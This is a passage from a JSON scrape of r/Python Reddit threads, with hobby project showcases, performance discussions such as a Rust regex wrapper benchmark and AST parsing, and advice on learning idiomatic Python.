                {
                    "author": "SAV_NC",
                    "score": "1",
                    "content": "what kind of command line would you implement using these tools?"
                }
            ]
        }
    ]
},
{
    "post_author": "Gautam-j",
    "post_id": "iwt09a",
    "post_score": "3810",
    "post_time": "Monday, September 21, 2020 at 6:52:04 AM GMT+3",
    "flair_text": "Machine Learning",
    "post_title": "End-to-End Self Driving Car - Need For Speed",
    "media": [
        "https://external-preview.redd.it/X35Y0D965dSRbLPmxNc7v3LaeVRZ7koY-luRUXou-jU.png?width=640&crop=smart&format=pjpg&auto=webp&s=0acc2e940e04f71ffbee6d97efc57a3a2927fe30"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "jesuisunnomade",
            "score": "343",
            "content": "This gave me anxiety",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "122",
                    "content": "i hope when self driving cars go into service they project in big letters low validation score warnings for the passengers to see",
                    "replies": [
                        {
                            "author": "enjoytheshow",
                            "score": "45",
                            "content": "Nothing instills confidence in a self driving car like hundreds of warning messages",
                            "replies": [
                                {
                                    "author": "Gautam-j",
                                    "score": "1",
                                    "content": "Very true!"
                                }
                            ]
                        },
                        {
                            "author": "Gautam-j",
                            "score": "29",
                            "content": "Hahaha that would some kinda experience there!"
                        }
                    ]
                }
            ]
        },
        {
            "author": "Gautam-j",
            "score": "137",
            "content": "Link to code: GitHub"
        },
        {
            "author": "punos_de_piedra",
            "score": "119",
            "content": "Bravo man that's really cool. In need of refinements, but nothing comes out perfect the first time, and I'm still really impressed.",
            "replies": [
                {
                    "author": "Gautam-j",
                    "score": "56",
                    "content": "Thanks a lot! Yeah I'm still working on ways to improve this. The main restriction I found was to not able to have access to the game engine, and hence my only source of input is the screen image. That also does not let me use reinforcement learning :( Any ideas as to how I can use reinforcement learning in this scenario?"
                }
            ]
        }
    ]
},
{
    "post_author": "lutipri",
    "post_id": "1djdy0z",
    "post_score": "24",
    "post_time": "Wednesday, June 19, 2024 at 11:13:51 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "A JIT compiler for CPython",
    "media": [
        "https://www.youtube.com/watch?v=HxSHIpEQRjs",
        "https://github.com/faster-cpython"
    ],
    "post_content": "Brandt Bucher talks on JIT compiler for Python at CPython Core Developer Sprint. Brandt is a member of the Faster CPython project, which is working on making the reference implementation of the language faster via a variety of techniques.\nhttps://www.youtube.com/watch?v=HxSHIpEQRjs",
    "comments": [
        {
            "author": "banana33noneleta",
            "score": "3",
            "content": "There's an article on lwn.net, but it's paywalled.",
            "replies": [
                {
                    "author": "mechanickle",
                    "score": "6",
                    "content": "Here you go: https://lwn.net/SubscriberLink/977855/066153bb25e9adb1/"
                }
            ]
        },
        {
            "author": "zurtex",
            "score": "4",
            "content": "FYI the youtube link OP posted is from PyCon 2023, but the lwn link that u/mechanickle is about the talks given at PyCon 2024. I think we're still waiting for the PyCon 2024 talks to start being published."
        }
    ]
},
{
    "post_author": "wildpantz",
    "post_id": "1dh62bk",
    "post_score": "7",
    "post_time": "Sunday, June 16, 2024 at 3:00:34 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I created Yu-Gi-Oh! Power of Chaos save handler",
    "media": [
        "https://github.com/markomavrinac/yugioh_poc_save_handler"
    ],
    "post_content": "Quick backstory:\nUpper floor of my house is sort of a man-cave until we decorate it, so during this time I have two PCs which I use to play games with a friend when we have extra time to waste. The other day I remembered the game mentioned in the title and we had lots of fun playing it (there's 3 different games in this series). I decided I'd transfer the save file to my main PC so I can play when he's not visiting and I quickly learned it's an extremely annoying process to transfer save files across different PCs. Long story short, you need to find a proper registry key (which isn't always located at same spot for some reason) and you need to locate a system.dat file also located in a folder that isn't always in the same place. This process gets tedious pretty quick, so I decided to use the power of Python to make my life easier.\nWhat the project does:\nIt's essentially a CLI save handler for the game mentioned in the title. It has 5 slots where you can backup your current save or load the backup to the computer. It can also fix minor registry issues if needed.\nTarget audience:\nGiven that I'm about 20 years too late... I'd say mostly people with very slow PCs or people who like to inhale nostalgia.\nI learned a lot about using winreg and msvcrt and getch, so while I will likely get bored of the game in the coming weeks, I'm happy I learned something new in the meantime, plus maybe someone finds it useful!\nSource code: markomavrinac/yugioh_poc_save_handler: Yu-Gi-Oh! Power of Chaos save handler - A script to manage your save games across multiple computers (github.com)",
    "comments": []
},
{
    "post_author": "abhi9u",
    "post_id": "1dowa49",
    "post_score": "16",
    "post_time": "Wednesday, June 26, 2024 at 2:27:43 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Looking Under the Hood of Python's Set Data Structure",
    "media": [
        "https://blog.codingconfessions.com/p/cpython-set-implementation"
    ],
    "post_content": "This article dissects how Python implements the Set data structure. It covers a background on hash tables along with implementation of the key Set APIs: insertion, contains, removal and pop. A good way to learn how hash tables are implemented for real-world use cases.\nhttps://blog.codingconfessions.com/p/cpython-set-implementation",
    "comments": [
        {
            "author": "Fluid_Willow_8758",
            "score": "0",
            "content": "This article sounds like a valuable resource for anyone interested in understanding how hash tables and the Set data structure are implemented in Python. By delving into the background of hash tables and providing a detailed exploration of key Set APIs such as insertion, containment checks, removal, and pop operations, the article offers practical insights into real-world applications of these data structures. Understanding the implementation details of hash tables is crucial for developing efficient algorithms and choosing appropriate data structures for specific tasks. It allows developers to grasp the underlying mechanisms that enable fast retrieval, insertion, and deletion of elements in Sets, which are fundamental operations in many computational tasks."
        }
    ]
},
{
    "post_author": "cenit997",
    "post_id": "i9q4dx",
    "post_score": "3387",
    "post_time": "Friday, August 14, 2020 at 8:20:14 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "I finished my Python Ray Tracer capable of rendering refraction and thin film interference!",
    "media": [
        "https://www.reddit.com/r/madeinpython/",
        "https://www.reddit.com/r/madeinpython/comments/i9hgfb/i_finished_my_python_ray_tracer_capable_of/"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "cenit997",
            "score": "117",
            "content": "Source code: https://github.com/rafael-fuente/Python-Raytracer This was a fun project made in my spare time. (it took me two months to finish it) Some of the features implemented are refraction, thin film interference, textures, camera lens ,path tracing and animations. The animation was done rendering frame by frame. Each frame take a few seconds to render in a fast computer. Every question, critic, improvement about the source code is welcome and grateful! Full resolution animations: https://www.youtube.com/watch?v=vt9vAcZQT4A"
        },
        {
            "author": "parfamz",
            "score": "23",
            "content": "",
            "replies": [
                {
                    "author": "cenit997",
                    "score": "43",
                    "content": ""
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "21",
            "content": "Wow dude, I’m still new to programming, but I never thought python could do things like this!"
        }
    ]
},
{
    "post_author": "Gerold55",
    "post_id": "1dt4ang",
    "post_score": "0",
    "post_time": "Tuesday, July 2, 2024 at 12:14:50 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Minecraft using python",
    "media": [
        "https://github.com/Gerold55/PyCraft"
    ],
    "post_content": "I'm working on making minecraft in python but the game is definitely slow and am wondering if it's even possible? https://github.com/Gerold55/PyCraft",
    "comments": [
        {
            "author": "the_hoser",
            "score": "13",
            "content": "It's possible. You're going to have to make heavy use of ctypes to work with OpenGL or Vulkan. Performance is going to be an issue. I recommend looking into Cython to write the performance-sensitive sections of code. Is it the best way to go about making a Minecraft clone? Probably not. It's certainly possible, though."
        },
        {
            "author": "denehoffman",
            "score": "3",
            "content": "It’s possible but you’re going to need a lot of cython (or maybe rust, for the daring) code to make it performant. Python doesn’t have great ways of processing in parallel on gpus, not a ton of shader support, and the GIL makes it very impractical to do most of the things Minecraft would require, so you’ll end up writing the game in C and using Python as the API in the end anyway."
        },
        {
            "author": "pythonwiz",
            "score": "3",
            "content": "It is possible but it will be hard to match the performance of Java. Try to make a simple clone and not match every feature. Start with very basic goals and go from there. I'd recommend looking into PyOpenGL and PyGame."
        },
        {
            "author": "fortunatefaileur",
            "score": "6",
            "content": "It’s not really sensible to write a 3d game engine in Python even with numpy.",
            "replies": [
                {
                    "author": "cpadev",
                    "score": "4",
                    "content": "I don’t think it’s supposed to be sensible or reasonable, just fun."
                }
            ]
        },
        {
            "author": "Gerold55",
            "score": "2",
            "content": "To all who commented am not trying to do infinite worlds or to have 500 items in the game... this is something fun to see how far I can take it"
        },
        {
            "author": "baekalfen",
            "score": "1",
            "content": "Try PyPy and see how much that helps. It’s an alternative to the normal interpreter which “Just In Time” compile your code"
        },
        {
            "author": "Latter_Reflection899",
            "score": "1",
            "content": "before starting a project always search github for a similar project, a few people have tried this before"
        },
        {
            "author": "KrazyKirby99999",
            "score": "-3",
            "content": "Set your needed dependencies using requirements.txt or pyproject.toml and use a virtual environment",
            "replies": [
                {
                    "author": "Gerold55",
                    "score": "2",
                    "content": "I've added that to the game's repo"
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1djxyyw",
    "post_score": "1",
    "post_time": "Thursday, June 20, 2024 at 3:00:08 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "fischerrobinson",
            "score": "1",
            "content": "Not sure if this belongs here, but looking for ways to gain more experience and would enjoy collaborating on a larger Python project. Please feel free to comment or PM me if you are looking for some free help👍🏻"
        }
    ]
},
{
    "post_author": "bugboy404",
    "post_id": "g5bbss",
    "post_score": "3780",
    "post_time": "Tuesday, April 21, 2020 at 11:16:44 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "My Professor wants hand written assignments. So I made MyhandWriting.. that can write in myway on a A4 sheet paper.",
    "media": [
        "https://external-preview.redd.it/6zfWvumT-95QdltRjblJMJxyt1TvEvHiwaXWJrHtS6g.png?width=640&crop=smart&format=pjpg&auto=webp&s=2064eaa5d8462bf75855deee5f217881c5be6aca"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "CarefulWalrus",
            "score": "1169",
            "content": "Working for hours to save few minutes of unpleasant labor. Totally my style.",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "",
                    "content": "That's the story of my life.",
                    "replies": [
                        {
                            "author": "arkster",
                            "score": "30",
                            "content": "That's the story of my life."
                        },
                        {
                            "author": "undernutbutthut",
                            "score": "18",
                            "content": "This hurts so good"
                        }
                    ]
                },
                {
                    "author": "bugboy404",
                    "score": "447",
                    "content": "Just 3 hours of code.... Can save my 12 hours.. 8 assignments to write.. that's my way.."
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "Also ... variable base-line height add slant as it reaches the far side of the page (hands often do this IRL) Variable kerning between letters (humans are not machine consistent)",
            "replies": [
                {
                    "author": "terracnosaur",
                    "score": "51",
                    "content": "Also ... variable base-line height add slant as it reaches the far side of the page (hands often do this IRL) Variable kerning between letters (humans are not machine consistent)"
                }
            ]
        }
    ]
},
{
    "post_author": "0akman",
    "post_id": "1ddcyun",
    "post_score": "8",
    "post_time": "Tuesday, June 11, 2024 at 3:32:34 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Python Open-CV Tool-Chip Contact Length Calculation",
    "media": [
        "https://github.com/FrunzaDan/Tool-Chip_Contact_Length",
        "https://youtu.be/bndai6SlF6E"
    ],
    "post_content": "Just posted a video on a case study of a Python OpenCV algo that calculates the contact length between the tool and the chip in a metalworking machining process. The images have been captured with a high-speed camera.\nThe Python code and documentation on my GitHub: https://github.com/FrunzaDan/Tool-Chip_Contact_Length\nThe video: https://youtu.be/bndai6SlF6E\nEnjoy!\nWhat My Project Does\nThe Python algo uses Hough lines to locate the edges of the tool and the chip and calculate the distance between them.\nTarget Audience\nPython OpenCV enthusiasts and people in metalworking research.\nComparison\nI haven't seen any application like this in metalworking machining.",
    "comments": []
},
{
    "post_author": "jgloewen",
    "post_id": "1dh2o89",
    "post_score": "10",
    "post_time": "Sunday, June 16, 2024 at 10:55:16 AM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Tutorial: A Timely Python Multi-page Streamlit Application on Olympic Medal Winning Countries",
    "media": [
        "https://johnloewen.substack.com/p/a-beautiful-and-timely-python-multi",
        "https://github.com/loewenj700/streamlit_multipage_olympics"
    ],
    "post_content": "Streamlit is an open-source app framework that allows data scientists and analysts to create interactive web applications with ease.\nUsing just a few lines of Python, you can turn data scripts into shareable web apps.\nAnd combined with a data visualization library like Plotly, you can create beautiful charts and maps with only a few lines of code.\nIn this article, let me step you through how to use Streamlit to create a multi-page interactive application that visualizes Olympic medal data.\nThe application will have three pages:\nan overview of medal counts,\na country-specific analysis, and\na choropleth map displaying global medal distributions.\nLet’s get to it!\nLink to free article HERE\nGithub repo HERE",
    "comments": [
        {
            "author": "TTechTex",
            "score": "2",
            "content": "Wish there were better ones of these. I want to see more examples of pages with lots of interaction."
        }
    ]
},
{
    "post_author": "Balance-",
    "post_id": "1djpj8t",
    "post_score": "2",
    "post_time": "Wednesday, June 19, 2024 at 8:57:33 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "Experimental Python Wheels for Windows on ARM64",
    "media": [
        "https://github.com/cgohlke/win_arm64-wheels"
    ],
    "post_content": "For anyone on a (new) Windows on Arm system, I found this great repo with Arm64 Windows wheels:\nhttps://github.com/cgohlke/win_arm64-wheels\nHighlights\n256 packages for Python 3.12\nBuilt with numpy 2 if possible\nScipy stack: numpy with OpenBLAS, scipy, matplotlib, Pandas, scikit-learn, scikit-image, numba, etc.\nGIS stack: GDAL, netCDF4, pyproj, Shapely, rasterio, basemap, Fiona, etc.\nImage IO: Imagecodecs, Pillow, OpenImageIO, OpenEXR, pylibCZIrw, etc.\nNoteworthy: Pytorch, Kivy, opencv_python_headless, pymol-open-source, pywin32",
    "comments": []
},
{
    "post_author": "[deleted]",
    "post_id": "iiamfv",
    "post_score": "3356",
    "post_time": "Friday, August 28, 2020 at 7:47:05 PM GMT+3",
    "flair_text": "Beginner Showcase",
    "post_title": "This post has",
    "media": [
        "https://www.reddit.com/user/Krukerfluk/",
        "https://praw.readthedocs.io/en/latest/",
        "https://github.com/CalvinMiller190/reddit-post"
    ],
    "post_content": "3829 upvotes,\n572 downvotes,\n297 comments,\n3257 score,\nand 3 awards!\nEdits: 23526 since Friday, August 28, 2020 at 8:30PM EST.\nCredit to u/Krukerfluk and Tom Scott!\nCode: https://github.com/CalvinMiller190/reddit-post\nThis post uses the praw module to get the information about the post, then edits the post every second based on the information that it got!",
    "comments": [
        {
            "author": "[deleted]",
            "score": "185",
            "content": "Or does it? *Votes, reloads, unvotes, reloads",
            "replies": [
                {
                    "author": "Gabernasher",
                    "score": "26",
                    "content": "who did you invite?",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "16",
                            "content": "25 upvotes and nobody mentioned this. What has the world come to?!"
                        }
                    ]
                },
                {
                    "author": "Maoman1",
                    "score": "12",
                    "content": "That won't really work since reddit fuzzes post scores. Reload the page a few times in rapid succession and the number of votes will randomly go up and down quite a bit."
                },
                {
                    "author": "kdedev",
                    "score": "9",
                    "content": ""
                },
                {
                    "author": "[deleted]",
                    "score": "6",
                    "content": ""
                }
            ]
        },
        {
            "author": "Config_Crawler",
            "score": "105",
            "content": ""
        },
        {
            "author": "[deleted]",
            "score": "138",
            "content": "Ok"
        },
        {
            "author": "iamemu",
            "score": "21",
            "content": "Reminds me of a Tom Scott video"
        },
        {
            "author": "irontricep",
            "score": "11",
            "content": "testing.... testing... testing... nice :)"
        },
        {
            "author": "SpiritualCup",
            "score": "8",
            "content": "How do you get the amount of downvotes using PRAW??? Couldn’t figure it out"
        },
        {
            "author": "[deleted]",
            "score": "7",
            "content": "69 incoming"
        },
        {
            "author": "mick14731",
            "score": "7",
            "content": "no it doesn't"
        }
    ]
},
{
    "post_author": "RevolutionaryPen4661",
    "post_id": "1dfl5ja",
    "post_score": "0",
    "post_time": "Friday, June 14, 2024 at 10:27:10 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "I ported Rust's Regex Library To Python, but the time taken by the compile parameter was high.",
    "media": [],
    "post_content": "(.venv) PS D:\\flpc> python .\\seed\\test.py\nOperation  | flpc (ms)  | re (ms)   \n----------------------------------\nCompile    | 1496.18077 | 0.00000\nSearch     | 19.67597   | 1721.07339\nFind Match | 15.62524   | 16.72506\nFull Match | 15.62500   | 0.00000\nSplit      | 0.00000    | 1722.88108\nFind All   | 3.02815    | 1660.32910\nFind Iter  | 5.96547    | 1672.50776\nSub        | 0.00000    | 1548.61116\nSubn       | 6.70719    | 1676.84698\nEscape     | 4.87757    | 0.00000\n(.venv) PS D:\\flpc>\nflpc is the name of the library. I named it (spelt as flacpuc). The strange thing is that why the compile time is high of flpc (rust) than of re module (implemented in Pure-Python) (it does the same thing what re.compile does in Python). The benchmark is done on:\nPATTERN = r'(\\w+)\\s+(\\d+)'\nTEXT = ''.join(choices(ascii_letters + digits, k=1000))\n# choices function from random module\nITERATIONS = 100\nThe problem is that, the python should be slow in the parameter (Regex Compile). However, the rest of parameters looks great! VERY FAST!",
    "comments": [
        {
            "author": "PossibilityTasty",
            "score": "21",
            "content": "This pretty much looks like you compared an instant with a lazy compile."
        },
        {
            "author": "Oenomaus_3575",
            "score": "7",
            "content": ""
        },
        {
            "author": "Mount_Gamer",
            "score": "3",
            "content": "Sounds like an interesting project. I've been wanting to do something like this with rust, but i've been on the fence with it.... plus i'd need to learn rust (which i do want to do). Instead, i've very slowly (when i have time), trying to optimize what python can do with re with a similar concept to ripgrep/grep/sed/awk (but only for regex operations). I can get \"so so\" close results, but i do end up having to do multiprocessing to get close in some scenarios (and can leap ahead with it in some scenarios), but my ram usage increases. So i've ended up trying to optimize for ram usage with multiprocessing as well, but potentially only so much i can do. So far i've been proud to keep largeish 2-4GB log files with 1-2 million matches, under 2-4GB of ram (my initial attempts could invoke the OOM > 16GB), but ripgrep destroys me here and barely uses any RAM. Last time i talked to the developer of ripgrep on reddit, i could get some odd results, but recently (since picking up the project again), i can see the developer of ripgrep has closed those niche gaps as well, so kudo's to them. Python 3.13 may have some speed up improvements i'm looking forward to (fingers crossed), with the sub-interpreters. I am too boozy tonight to look at your project properly, but when i first read about what you were doing earlier, I was intrigued, so thought i'd comment :) I'm a busy person, but i would love to test what you're doing as well..... maybe over the weekend.",
            "replies": [
                {
                    "author": "burntsushi",
                    "score": "1",
                    "content": "but recently (since picking up the project again), i can see the developer of ripgrep has closed those niche gaps as well, so kudo's to them Also, looking at your benchmarks, you are comparing Python's regex engine running in ASCII mode with ripgrep's engine running in Unicode mode. It actually matters in at least some of your benchmarks: $ hyperfine \\ \"rg-14.1.0 -No 'SRC=([\\d\\.]+)\\s+DST' ufw.test1 -r '\\$1'\" \\ \"rg-14.1.0 --no-unicode -No 'SRC=([\\d\\.]+)\\s+DST' ufw.test1 -r '\\$1'\" Benchmark 1: rg-14.1.0 -No 'SRC=([\\d\\.]+)\\s+DST' ufw.test1 -r '$1' Time (mean ± σ):      4.475 s ±  0.023 s    [User: 4.346 s, System: 0.127 s] Range (min … max):    4.448 s …  4.519 s    10 runs Benchmark 2: rg-14.1.0 --no-unicode -No 'SRC=([\\d\\.]+)\\s+DST' ufw.test1 -r '$1' Time (mean ± σ):      3.821 s ±  0.023 s    [User: 3.699 s, System: 0.120 s] Range (min … max):    3.792 s …  3.855 s    10 runs Summary rg-14.1.0 --no-unicode -No 'SRC=([\\d\\.]+)\\s+DST' ufw.test1 -r '$1' ran 1.17 ± 0.01 times faster than rg-14.1.0 -No 'SRC=([\\d\\.]+)\\s+DST' ufw.test1 -r '$1' This is because Unicode mode tends to thwart the one-pass DFA optimization. And indeed, it applies in this case when the pattern is compiled without Unicode mode enabled. When Unicode mode is enabled, things like \\s and \\d match a lot more than just the ASCII definitions of whitespace and digits, and that prevents the one-pass optimization. Usually toggling Unicode mode doesn't make too much of a difference in ripgrep (unlike in GNU grep), but this is a case where it does matter."
                }
            ]
        },
        {
            "author": "Mount_Gamer",
            "score": "1",
            "content": "i am boozy, but any idea why this is happening? For the security conscious out there, this is just root in a controlled container... not root in my main system. (venv) root@regex-test:~/venv/pygrep# time ./pygrep.py -p '\\sDST=(123.12.123.12)\\s' '1' -m4 -Sc -f pygrep/ufw.test1 Traceback (most recent call last): File \"/root/venv/pygrep/./pygrep.py\", line 59, in <module> import flpc as re ModuleNotFoundError: No module named 'flpc' real0m0.098s user0m0.077s sys0m0.021s (venv) root@regex-test:~/venv/pygrep# pip list Package Version ------- ------- flpc    0.1.1 pip     24.0 (venv) root@regex-test:~/venv/pygrep# pip show flpc Name: flpc Version: 0.1.1 Summary: A Rust-based regex port for Python3 to faster performance. 👾 Home-page: Author: Author-email: License: MIT Location: /root/venv/lib/python3.12/site-packages Requires: Required-by:",
            "replies": [
                {
                    "author": "RevolutionaryPen4661",
                    "score": "1",
                    "content": "can you do \"cat pygrep.py\"? I want to review the entire script that you're running. Maybe the SHEBANG Line is the culprit. e.g. #!/usr/bin/env python."
                },
                {
                    "author": "Mount_Gamer",
                    "score": "1",
                    "content": "Would help if i wasn't boozy lol. I had #!/usr/bin/python3 in the shebang, changed it to #!/usr/bin/env python3 and it now imports"
                }
            ]
        },
        {
            "author": "burntsushi",
            "score": "1",
            "content": "As the author of the regex crate, I thought at first that you had rewritten some portion of the crate in Python, as that is usually what \"port\" means. I think what you have instead is an \"FFI wrapper to Rust's regex crate.\" A related (and well run) project is ahocorasick_rs. It's an FFI wrapper around the aho-corasick Rust crate (which is a dependency of the regex crate). So there might be something to learn there in terms of how the project is setup and how strings are handled. In terms of your benchmark, I would generally expect the regex crate to compile patterns faster than re. With that said, I also generally consider pattern compilation in the regex crate to be pretty slow. However, my understanding is that Python's re.compile caches pattern compilation. Thankfully, the re module provides a way to clear its cache via re.purge().",
            "replies": [
                {
                    "author": "RevolutionaryPen4661",
                    "score": "2",
                    "content": "I have updated the description. Previously, I always referred to the packages used as \"ports,\" 😂 but now I understand that it should be written as \"wrapper to Python3 term. https://pypi.org/project/flpc/"
                }
            ]
        },
        {
            "author": "Mount_Gamer",
            "score": "1",
            "content": "Cant use it entirely as a drop in replacement for some of what i've got already in place, which uses re.Pattern for type hints, and the group attribute."
        }
    ]
},
{
    "post_author": "mshoaib9711",
    "post_id": "glzol8",
    "post_score": "3747",
    "post_time": "Monday, May 18, 2020 at 2:26:11 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "So I made a Python and Arduino project that dynamically changes sets the ambient lighting to match the computed dominant color values from the wallpapers.",
    "media": [
        "https://external-preview.redd.it/mpeyTJfPwYwZZhbtO7yoENjWOhFAxTuY-T6O8ZaSpGc.png?width=640&crop=smart&format=pjpg&auto=webp&s=24d6be46d141b387c0880957317845454b55a625"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Zhababui",
            "score": "121",
            "content": "This is really cool. I also love all of your wallpapers. Would making this work for something like every X frame of a video game work? Or would that fry the Arduino. I’m not very familiar with them.",
            "replies": [
                {
                    "author": "mshoaib9711",
                    "score": "64",
                    "content": "Thanks a lot! Yes. That was definitely in my mind. Wouldn't be a bad idea to attempt. CPU optimisation would be key there.",
                    "replies": [
                        {
                            "author": "densvedigegris",
                            "score": "13",
                            "content": "You would probably have to do it at 30 fps or more to make it smooth. I'm not sure how that would affect performance, since you would have to transfer the screen buffer (essentially take a screenshot) 30 times a second. The CPU stuff could be done extremely fast with a vector library (NumPy might even be enough).",
                            "replies": [
                                {
                                    "author": "f3xjc",
                                    "score": "10",
                                    "content": "With lag you can make anything smooth. IE take 1 screenshot per second, smoothly interpolate between color 1 and 2 over a second. Only downside is you're always one second late, probably only visible on a fast transition. Then you can see how fast you can Crank the thing. Probably 5 per second feel interactive."
                                }
                            ]
                        },
                        {
                            "author": "Zhababui",
                            "score": "7",
                            "content": "Good luck!"
                        }
                    ]
                }
            ]
        },
        {
            "author": "cansozbir",
            "score": "40",
            "content": "can you please share these wallpapers :) great work btw"
        },
        {
            "author": "mshoaib9711",
            "score": "18",
            "content": "Hey guys! Thank you all for your overwhelming responses. This is my first time ever posting on Reddit. Didn't expect such great responses. Thanks a lot. Definitely motivates me to keep going. Also for everyone asking for code, I will be making the repo ready for public by the end of the day so for those willing to contribute can start right away. Thanks again guys. Means a lot to me🙌🏻"
        },
        {
            "author": "Eelz_",
            "score": "43",
            "content": "Code?"
        }
    ]
},
{
    "post_author": "Human_Dependent6814",
    "post_id": "1dgye28",
    "post_score": "17",
    "post_time": "Sunday, June 16, 2024 at 6:09:23 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "Learning Python coming from a JVM background ",
    "media": [],
    "post_content": "I have 4 years worth JVM languages (Java, Kotlin) and have a need to learn some Python. What's a good resource to get up to speed quickly with idiomatic Python?",
    "comments": [
        {
            "author": "cipri_tom",
            "score": "15",
            "content": "Videos from Raymond Hattinger, especially the one where he shows how Java people tend to write python and then he transforms it into idiomatic python Edit : unintuitive title, beyond pep8: https://youtu.be/wf-BqAjZb8M?si=97IXZo0JhHz0TlLp"
        },
        {
            "author": "gmes78",
            "score": "16",
            "content": "The official Python tutorial."
        },
        {
            "author": "grantrules",
            "score": "10",
            "content": "As a resource, I like the book Fluent Python. Not something I'd sit down and read front-to-back, but it's good to skim the concepts and refer back to em.",
            "replies": [
                {
                    "author": "alech_de",
                    "score": "2",
                    "content": "Seconding that, except that I’m actually in the process of reading it front to back. I also use Exercism to go through some exercises and the community solutions and mentoring helps a lot with learning idiomatic Python (and standard library features I wasn’t aware of yet 🙃)."
                }
            ]
        },
        {
            "author": "ogaat",
            "score": "4",
            "content": "Use the official Python specification and tutorial. It is a pretty logical, easy and straightforward language, with its power coming from its extensive libraries. Just one tip - Python's dynamic nature, loose typing and lack of private and protected types drove me nuts and led to many bugs before I got used to it. That is compensated by you spending most of your thinking on your problem, rather than on the language syntax. Your mileage may vary.",
            "replies": [
                {
                    "author": "Desperate-Dig2806",
                    "score": "2",
                    "content": "Working with data that has bit me in the ass so many times. You have chunks that are well formed and then all of a sudden you get 100k rows where a column is null all through and then blows up trying to get inserted to the db because Pandas/library of choice inferred a different type. So then you have to go through the whole typing thing any way (which you should have earlier but hey it worked on my machine). So yeah, be careful. (not knocking the language just some issues in my particular field)"
                }
            ]
        },
        {
            "author": "KelleQuechoz",
            "score": "2",
            "content": "https://speedsheet.io/s/python"
        },
        {
            "author": "physics_douglas",
            "score": "2",
            "content": "Rackerhank"
        },
        {
            "author": "reddifiningkarma",
            "score": "2",
            "content": "https://github.com/satwikkansal/wtfpython"
        },
        {
            "author": "im_the_tea_drinker_",
            "score": "1",
            "content": "I have the reverse question for you. I spent 10 years in Python and now looking to branch out to java. any recommendations?"
        }
    ]
},
{
    "post_author": "FareedKhan557",
    "post_id": "1dez1ru",
    "post_score": "3",
    "post_time": "Thursday, June 13, 2024 at 4:30:15 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Building AI Text-to-Video Model From Scratch",
    "media": [
        "https://github.com/FareedKhan-dev/AI-text-to-video-model-from-scratch"
    ],
    "post_content": "What My Project Does\nThis project aims to create a small-scale text-to-video model that can generate videos based on text prompts.\nTarget audience\nThis project is designed for individuals who want to learn how to create their own text-to-video model from scratch but don't know where to start. It will provide a basic guide from beginning to end, covering everything from generating the training data to training a model and using that trained model to generate AI videos.\nComparison\nCurrently available text-to-video models require high computational power, and their complex code makes it difficult for Rookie developers to understand the practical implementation, beyond just the theory. To address this, I have created a small-scale GAN architecture, similar to text-to-video models, which can be trained on a CPU or a single T4 GPU.\nGitHub\nCode, documentation, and example can all be found on GitHub:\nhttps://github.com/FareedKhan-dev/AI-text-to-video-model-from-scratch",
    "comments": [
        {
            "author": "FuturesBrightDavid",
            "score": "3",
            "content": "Nice work!"
        }
    ]
},
{
    "post_author": "the1024",
    "post_id": "1div2e8",
    "post_score": "38",
    "post_time": "Tuesday, June 18, 2024 at 7:36:18 PM GMT+3",
    "flair_text": "News",
    "post_title": "Parsing Python ASTs 20x faster with Rust",
    "media": [
        "https://www.gauge.sh/blog/parsing-python-asts-20x-faster-with-rust"
    ],
    "post_content": "https://www.gauge.sh/blog/parsing-python-asts-20x-faster-with-rust",
    "comments": [
        {
            "author": "troyunrau",
            "score": "9",
            "content": "I see these sorts of things all the time and wonder: is it the language that is faster or the implementation. Nearly speed gain like this comes with a drawback somewhere -- some corner cases that stop working or something. If they didn't, then rewriting to obtain this speed should be possible in other lower level languages (C, Fortran, etc.)",
            "replies": [
                {
                    "author": "Then-Opportunity-684",
                    "score": "4",
                    "content": "Hi I'm the author of the blog post! I think in this case it would definitely be possible to get the same performance in another low-level language. Any compiled extension which avoids building the AST representation out of PyObjects should show better performance than the naive implementation, even if the logic of the parser is identical to the one found in CPython. Like the other comment said, I used the custom parser that ruff uses because it was built for a very similar use case and the best alternative (the RustPython parser) was not as reliable in my tests."
                },
                {
                    "author": "proggob",
                    "score": "2",
                    "content": "Python uses a standard PEG grammar now so there shouldn’t be any corner cases."
                },
                {
                    "author": "SV-97",
                    "score": "2",
                    "content": "It's of course (in large parts) the implementation - but coming up with a given implementation and implementing it (in a maintainable way) is very much language dependent. There's no difference in theory but there is one in pratice. Rust allows you to be somewhat faster for some things than C or whatever (honestly mentioning Fortran for a text processing thing is wild) in pratice because it allows you to be very conservative with copies etc. It also helps that it has very good implementations of many standard data structures and algorithms you might want to use (as opposed to C++ where they're bad and third party code can be annoying to integrate, or C where they don't exist), and that it's so much easier to parallelize. So could you write C that mirrors this in terms of speed? Yes, of course. But no ones going to do it"
                },
                {
                    "author": "the1024",
                    "score": "1",
                    "content": "Cpython is basically all C anyways - the article talks a bit about why Python was still so slow as compared to rust. The code is open source too, so you can take a peek! https://github.com/gauge-sh/tach"
                },
                {
                    "author": "BossOfTheGame",
                    "score": "1",
                    "content": "It's how implementations of languages allocate memory. In order to have the flexibility you know and love Python objects are fairly heavy weight and they always use the heap and thus need garbage collection. In this case rust structures are much more efficient, and we don't need intermediate data structures to be flexible."
                }
            ]
        }
    ]
},
{
    "post_author": "AlexTheRandomizer",
